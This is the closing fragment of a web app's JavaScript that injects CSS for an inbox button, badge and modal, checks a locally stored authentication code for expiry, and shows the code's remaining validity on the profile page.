  // Add CSS for the inbox button and notification badge
  const style = document.createElement("style")
  style.textContent = `
    .inbox-btn {
      margin-top: 15px;
      position: relative;
    }
    
    .notification-badge {
      position: absolute;
      top: -8px;
      right: -8px;
      background-color: #f44336;
      color: white;
      border-radius: 50%;
      width: 20px;
      height: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      font-weight: bold;
    }
    
    .hidden {
      display: none !important;
    }

    /* Auth modal styles */
    .modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
    }

    .modal-content {
      background-color: white;
      border-radius: 8px;
      width: 90%;
      max-width: 500px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
    }

    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 20px;
      border-bottom: 1px solid #eee;
    }

    .modal-header h2 {
      margin: 0;
      font-size: 1.5rem;
      color: #333;
    }

    .close-btn {
      background: none;
      border: none;
      font-size: 1.2rem;
      cursor: pointer;
      color: #777;
    }

    .modal-body {
      padding: 20px;
    }

    .modal-footer {
      padding: 15px 20px;
      border-top: 1px solid #eee;
      text-align: right;
    }

    .auth-code-actions {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    #auth-error {
      color: #f44336;
      margin-top: 10px;
    }
  `
  document.head.appendChild(style)

  // Add a function to check authentication status on page load
  function checkAuthenticationStatus() {
    const session = JSON.parse(localStorage.getItem("userSession")) || {}

    if (session.authenticated && session.authExpires) {
      // Check if authentication is expired
      if (new Date(session.authExpires) < new Date()) {
        // Authentication expired
        session.authenticated = false
        session.authCode = null
        session.authExpires = null
        localStorage.setItem("userSession", JSON.stringify(session))

        // Show toast notification
        if (dashboardPage && !dashboardPage.classList.contains("hidden")) {
          showToast(
            "Your authentication code has expired. Please enter a new code when you need to flash emails.",
            "info",
          )
        }
      } else {
        // Show expiration date in toast
        const daysLeft = Math.ceil((new Date(session.authExpires) - new Date()) / (1000 * 60 * 60 * 24))
        if (dashboardPage && !dashboardPage.classList.contains("hidden")) {
          showToast(`Your authentication is valid for ${daysLeft} more days`, "info")
        }
      }
    }
  }

  // Call this function after checking session
  checkSession()
  checkAuthenticationStatus()

  // Add CSS for the authentication status
  const authStyle = document.createElement("style")
  authStyle.textContent = `
  .auth-status {
    display: flex;
    align-items: center;
    margin-top: 10px;
    padding: 8px 12px;
    border-radius: 4px;
    font-size: 14px;
    background-color: #f8f9fa;
    border-left: 3px solid #0066ff;
  }
  
  .auth-status.expired {
    border-left-color: #f44336;
  }
  
  .auth-status i {
    margin-right: 8px;
    font-size: 16px;
  }
  
  .auth-status .auth-days {
    font-weight: bold;
    margin: 0 4px;
  }
  
  .auth-code-input {
    font-family: monospace;
    letter-spacing: 1px;
  }
  
  #flash-auth-code {
    font-family: monospace;
    letter-spacing: 1px;
  }
  
  .close-btn {
    width: 30px;
    height: 30px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 50%;
    transition: background-color 0.2s;
  }
  
  .close-btn:hover {
    background-color: rgba(0, 0, 0, 0.1);
  }
`
  document.head.appendChild(authStyle)

  // Add authentication status to profile page
  function updateAuthStatusInProfile() {
    const session = JSON.parse(localStorage.getItem("userSession")) || {}
    const profileInfoSection = document.querySelector(".profile-info-section")

    if (profileInfoSection && session.authenticated) {
      // Remove existing auth status if any
      const existingStatus = document.querySelector(".auth-status")
      if (existingStatus) {
        existingStatus.remove()
      }

      // Create auth status element
      const authStatus = document.createElement("div")
      authStatus.className = "auth-status"

      if (session.authExpires && new Date(session.authExpires) > new Date()) {
        // Authentication is valid
        const daysLeft = Math.ceil((new Date(session.authExpires) - new Date()) / (1000 * 60 * 60 * 24))
        authStatus.innerHTML = `
        <i class="fas fa-check-circle" style="color: #4caf50;"></i>
        <span>Authentication valid for <span class="auth-days">${daysLeft}</span> more days</span>
      `
      } else {
        // Authentication expired
        authStatus.className = "auth-status expired"
        authStatus.innerHTML = `
        <i class="fas fa-exclamation-circle" style="color: #f44336;"></i>
        <span>Authentication expired</span>
      `
      }

      // Add to profile
      profileInfoSection.appendChild(authStatus)
    }
  }

  // Call this when profile page is shown
  const profileMenuItemSidebar2 = document.querySelector('.sidebar-menu li a[href="#profile"]')
  if (profileMenuItemSidebar2) {
    profileMenuItemSidebar2.addEventListener("click", (e) => {
      // Existing code...

      // Update auth status
      updateAuthStatusInProfile()
    })
  }
})
